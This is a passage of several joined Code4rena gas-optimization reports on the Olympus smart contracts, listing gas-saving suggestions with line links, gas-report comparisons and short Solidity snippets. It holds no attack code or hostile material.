52730 (-23)     OlympusGovernance: configureDependencies: 48513 -> 48490 (-23)     OlympusGovernance: endorseProposal: 39015 -> 39037 (+22)     OlympusGovernance: executeProposal: 171376 -> 171467 (+91)     OlympusGovernance: getMetadata: 2195 -> 2172 (-23)     OlympusGovernance: isActive: 696 -> 740 (+44)     OlympusGovernance: noVotesForProposal: 549 -> 571 (+22)     OlympusGovernance: proposalHasBeenActivated:486 -> 463 (-23)     OlympusGovernance: reclaimVotes: 10009 -> 9927 (82)     OlympusGovernance: requestPermissions: 2953 -> 2997 (+44)     OlympusGovernance: tokenClaimsForProposal: 684 -> 728 (+44)     OlympusGovernance: totalEndorsementsForProposal: 529 -> 506 (-23)     OlympusGovernance: userEndorsementsForProposal: 727 ->  639 (-88)     OlympusGovernance: userVotesForProposal: 662 -> 706 (-23)     OlympusGovernance: vote: 61568 -> 61612 (+44)     OlympusGovernance: yesVotesForProposal: 506 -> 483 (-23)     Operator: Deployment: 4679925 -> 4671717 (-8208)     Operator: auctioneer: 437 -> 372 (-65)     Operator: callback: 439 -> 372 (-67)     Operator: config: 1224 -> 1246 (+19)     Operator: configureDependencies: 121016 -> 121038 (+22)     Operator: fullCapacity: 5237 -> 5204 (-33)     Operator: initialize: 316017 -> 315844 (-173)     Operator: initialized: 1356 -> 1379 (+23)     Operator: isActive: 439 -> 373 (-66)     Operator: operate: 122263 -> 122281 (+18)     Operator: regenerate: 17622 -> 17612 (-10)     Operator: requestPermissions: 6634 -> 6656 (+22)     Operator: setBondContracts: 5267 -> 5289 (+22)     Operator: setRegenParams: 11480 -> 11413 (-67)     Operator: setSpreads: 9650 -> 9672 (+22)     Operator: setThresholdFactor: 12113 -> 12135 (+22)     Operator: status: 8988 -> 9010 (+22)     Operator: swap: 54322 -> 54342 (+20)     Operator: toggleActive: 7460 -> 7482 (+22)  ## [G-07] Using `storage` instead of `memory`  can be cheaper.  A `storage` structure is pre allocated by the contract, by contrast, a `memory` one is newly created. Depending on the case both can be used to optimize the gas cost because simply, a `storage` is cheaper to create but more expensive to read from and to return and a `memory` on the other hand is more expensive to create but cheaper to read from and to return. We can optimize with trials and errors instead of complex calculations (which will probably work a bit better, but it's not done here).  Following this, we can deduce 7 cases that can be swapped to optimize runtime cost and deployment cost: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L379 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L385 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L666  Consider changing `memory` to `storage` in these lines  With these changes, these evolutions in gas average report can be observed:      Kernel: Deployment:  1473364->1456343 (-17021)     OlympusRange: Deployment:   1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     BondCallback: Deployment: 1408325 ->  1391912  (-16413)     BondCallback: amountsForMarket: 1921 -> 1669 (-252)     OlympusGovernance: Deployment: 1638243 -> 1596194 (-42049)     OlympusGovernance: activateProposal: 52753 -> 51723 (-1030)     Operator: Deployment: 4679925 -> 4566769 (-113156)     Operator: fullCapacity: 5237 -> 5182 (-55)     Operator: initialize: 316017 -> 315911 (-106)     Operator: operate: 122263 -> 118511 (-3752)     Operator: regenerate: 17622 -> 17593 (-29)     ModuleTestFixture :Deployment: 422065 -> 399069 (-22996)    ## [G-08] Using `calldata` instead of `memory` for read only argument in external function If a function parameter is read only, it is cheaper in gas to use `calldata` instead of `memory`.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53  Consider changing `memory` to `calldata` in these lines/  With these changes, these evolutions in gas average report can be observed:      OlympusPrice: Deployment: 1117743 -> 1101930 (-15813)     OlympusPrice: initialize: 432495 -> 430562 (-1933)     BondCallback: Deployment: 1408325 -> 1386305 (-22020)     BondCallback: batchToTreasury: 12729 -> 12543 (-186)     OlympusPriceConfig: initialize: 491657 -> 486274 (-5383)     TreasuryCustodian: Deployment: 739696 -> 719277 (-20419)     TreasuryCustodian: revokePolicyApprovals: 6956 -> 6842 (-114)  # Medium effect in use ## [G-09] `external` function for the admin can be marked as `payable`  If a function is guaranteed to revert when called by a normal user, this function can be marked as `payable` to avoid the check to know if a payment is provided.  2 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  Consider adding `payable` keyword.  *Save 21 gas cost*  # High effect on readability  ## [G-10] Optimise function name Every function have a keccak256 hash, this hash defines the order of the function in the contract. The best the ranking, the minimum the gas usage to access the function. Each time a function is called, the EVM need to pass through all the functions better ranked (going through a function cost 22 gas), and this operation cost gas. This can be optimized, the ranking is defined by the first four bytes of the kekkack256 hash of the function name. The name can be changed to improve the ranking, which greatly impacts the readability. That's why it's not practical to change all the names, but it's possible to change only the ones of the functions called a lot of times. This change can be done on the following functions according to their number of uses in the tests and their current ranking.  1. `Kernel.sol`: f166d9eb - `modulePermissions(bytes5,address,bytes4)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 00097fbb - `modulePermissions_1055(bytes5,address,bytes4)` **Rank:** 14 -> 1 *Save 286 gas each call*  2. `Kernel.sol`: c4d1f8f1 -  `executeAction(uint8,address)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 000a8da2 - `executeAction_11563(uint8,address)` **Rank:** 11 -> 2 *Save 198 gas each call*  3. `MINTR.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 02b1d239 - `ohm()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  4. `RANGE.sol`: bf30142b - `capacity(bool)` **Must outrank:** 00d16739 - `regenerate(bool,uint256)` **New name:** 00e60c55 - `capacity_81(bool)` **Rank:** 14 -> 1 *Save 286 gas each call*  5. `TRSRY.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 15226b54 - `getReserveBalance(address)` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  6. `VOTE.sol`: 1ae7ec2e - `KEYCODE()` **Must outrank:** 06fdde03 - `name()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 3 -> 1 *Save 44 gas each call*  7. `Governance.sol`: d1755067 - `endorseProposal(uint256)` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 007fedae - `endorseProposal_861(uint256)` **Rank:** 22 -> 1 *Save 462 gas each call*  8. `Governance.sol`: 9459b875 - `configureDependencies()` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 00aced39 - `configureDependencies_1382()` **Rank:** 18 -> 2 *Save gas each call*  9. `Operator.sol`: 7159a618 - `operate()` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 000b8875 - `operate_53()` **Rank:** 18 -> 1 *Save 352 gas each call*  10. `Operator.sol`: ec7404b1 - `setActiveStatus(bool)` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 00d3138f - `setActiveStatus_78(bool)` **Rank:** 31 -> 2 *Save 638 gas each call*  Consider optimizing these function names.
| | issue | | ----------- | ----------- | | 1 | [`<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )](#1-x--y-costs-more-gas-than-x--x--y-for-state-variables-same-with) | | 2 | [can make the variable outside the loop to save gas](#2-can-make-the-variable-outside-the-loop-to-save-gas) | | 3 | [`++i` costs less gas than `i++`, especially when it’s used in for-loops (--i/i-- too)](#3-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too) | | 4 | [it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied](#4-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied) | | 5 | [using `calldata` instead of `memory` for read-only arguments in external functions saves gas](#5-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas) | | 6 | [using `bools` for storage incurs overhead](#6-using-bools-for-storage-incurs-overhead) | | 7 | [internal functions only called once can be inlined to save gas](#7-internal-functions-only-called-once-can-be-inlined-to-save-gas) | | 8 | [usage of uint/int smaller than 32 bytes (256 bits) incurs overhead](#8-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead) | | 9 | [using private rather than public for constants, saves gas](#9-using-private-rather-than-public-for-constants-saves-gas) | | 10 | [not using the named return variables when a function returns, wastes deployment gas](#10-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas) | | 11 | [state variables only set in the constructor should be declared](#11-state-variables-only-set-in-the-constructor-should-be-declared) | | 12 | [`<array>.length` should not be looked up in every loop of a for-loop](#12-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) |    ## 1. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )  - [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222)  - [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132)  - [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58)  - [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  - [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144)  - [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103)   ## 2. can make the variable outside the loop to save gas  - [KernelUtils.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 3. `++i` costs less gas than `i++`, especially when it’s used in for-loops (--i/i-- too)  Saves 6 gas per loop  - [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  - [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) - [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) - [Operator.sol#L675](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L675) - [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) - [Operator.sol#L691](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L691)   ## 4. it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied  - [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397)  - [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 5. using `calldata` instead of `memory` for read-only arguments in external functions saves gas  - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  - [Governance.sol#L159](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L159)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  - [TreasuryCustodian.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53)  - [BondCallback.sol#L152](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)   ## 6. using `bools` for storage incurs overhead  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  - [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62)  - [RANGE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L127) - [RANGE.sol#L184](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L184) - [RANGE.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L216) - [RANGE.sol#L281](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L281) - [RANGE.sol#L291](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L291) - [RANGE.sol#L302](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L302) - [RANGE.sol#L320](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L320) - [RANGE.sol#L330](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L330) - [RANGE.sol#L340](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L340)  - [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113) - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L126) - [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181) - [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194) - [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197) - [Kernel.sol#L394](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L394)  - [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105) - [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117) - [Governance.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240)  - [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24)  - [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33)  - [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63) - [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66) - [Operator.sol#L363](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L363) - [Operator.sol#L473](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L473) - [Operator.sol#L618](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L618) - [Operator.sol#L634](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L634) - [Operator.sol#L699](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L699) - [Operator.sol#L732](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L732) - [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L735) - [Operator.sol#L778](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L778)   ## 7. internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  - [Kernel.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L266) - [Kernel.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L279) - [Kernel.sol#L295](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295) - [Kernel.sol#L325](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325) - [Kernel.sol#L351](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L351) - [Kernel.sol#L378](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L378) - [Kernel.sol#L409](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L409)  - [Heart.sol#L111](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111)  - [Operator.sol#L652](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L652)   ## 8. usage of uint/int smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  - [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44) - [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47) - [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50) - [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53) - [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75) - [PRICE.sol#L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76) - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205) - [PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240) - [PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84) - [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45) - [PriceConfig.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58) - [PriceConfig.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89) - [Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97) - [Operator.sol#L516](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516) - [Operator.sol#L528](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528) - [Operator.sol#L529](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529) - [Operator.sol#L530](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530) - [Operator.sol#L548](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548) - [Operator.sol#L560](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560) - [Operator.sol#L561](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561) - [Operator.sol#L562](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562) - [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665) - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83) - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86) - [Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418)   ## 9. using private rather than public for constants, saves gas  If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves 3406-3606 gas in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table  - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  - [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121) - [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124) - [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127) - [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130) - [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133) - [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)   ## 10. not using the named return variables when a function returns, wastes deployment gas  - [INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)  - [MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)  - [PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)  - [Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  - [TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  - [RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  - [VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)  - [BondCallback.sol#L177](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L177)   ## 11. state variables only set in the constructor should be declared   avoids a gsset (20000 gas)  - [Heart.sol#L48](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L48)  - [BondCallback.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28) - [BondCallback.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)   ## 12. `<array>.length` should not be looked up in every loop of a for-loop  This reduce gas cost as show here https://forum.openzeppelin.com/t/a-collection-of-gas-optimisation-tricks/19966/5  - [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  
##### Summary  Gas savings are estimated using the gas report of existing `FORGE_GAS_REPORT=true forge test` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need. Some optimizations (mostly logical) cannot be scored with a exact gas quantity.  Gas Optimizations ||Issue|Instances|Estimated gas(deployments)|Estimated gas(method call)| |:---:|:---|:---:|:---:|:---:| |**1**|Replace `modifier` with `function`|6|460 154|-| |**2**|`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping`|7|188 639|5 032| |**3**|Using `private` rather than `public` for constants, saves gas|8|45 857|308| |**4**|Use elementary types or a user-defined `type` instead of a `struct` that has only one member|1|30 714|1 037| |**5**|State variables should be cached in stack variables rather than re-reading them from storage|7|24 021|614| |**6**|Using bools for storage incurs overhead|6|23 611|4 485| |**7**|State variables can be packed into fewer storage slots|3|23 292|1 711| |**8**|Expressions that cannot be overflowed can be unchecked|5|23 016|-| |**9**|Increment optimization|18|↓|↓| |**9.1**|Prefix increments are cheaper than postfix increments, especially when it's used in for-loops|3|400|-| |**9.2**|`<x> = <x> + 1` even more efficient than pre increment|18|14 217|-| |**10**|Use named `returns` for local variables where it is possible|3|5 400|-| |**11**|`x = x + y` is cheaper than `x += y;`|6|5 000|-| |**12**|Deleting a struct is cheaper than creating a new struct with null values.|1|4 207|-| |**13**|Don't compare boolean expressions to boolean literals|2|1 607|-| |**14**|`revert` operator should be in the code as early as reasonably possible|3|200|1 559+| |**15**|Duplicated require()/revert() checks should be refactored to a modifier or function|4|-|8 111|  **Total: 83 instances over 15 issues**  ---  1. **Replace `modifier` with `function` (6 instances)**     modifiers make code more elegant, but cost more than normal functions     Deployment Gas Saved: **460 154**     All modifiers except `permissioned` due to unresolved error flow     - src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)     ```solidity    70     modifier onlyKernel() {    71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);    72         _;    73     }    ...    119    modifier onlyRole(bytes32 role_) {    120        Role role = toRole(role_);    121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);    122        _;    123    }    ...    223    modifier onlyExecutor() {    224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);    225        _;    226    }    227    228    /// @notice Modifier to check if caller is the roles admin.    229    modifier onlyAdmin() {    230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);    231        _;    232    }    ```     - src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)     ```solidity    188    modifier onlyWhileActive() {    189        if (!active) revert Operator_Inactive();    190        _;    191    }    ```     - [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)     ```solidity    if (!initialized) revert Price_NotInitialized(); // @note 4 instances    ```  2. **`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)**     Deployment Gas Saved: **188 639**    Method Call Gas Saved: **5 032**     It may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.     - src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)     ```solidity    379        Policy[] memory dependents = moduleDependents[keycode_];    ```     fix(the same for others):     ```solidity    Policy[] storage dependents = moduleDependents[keycode_];    ```     - src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)     ```solidity    179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];    ```     - src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)     ```solidity    206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];    ```     - 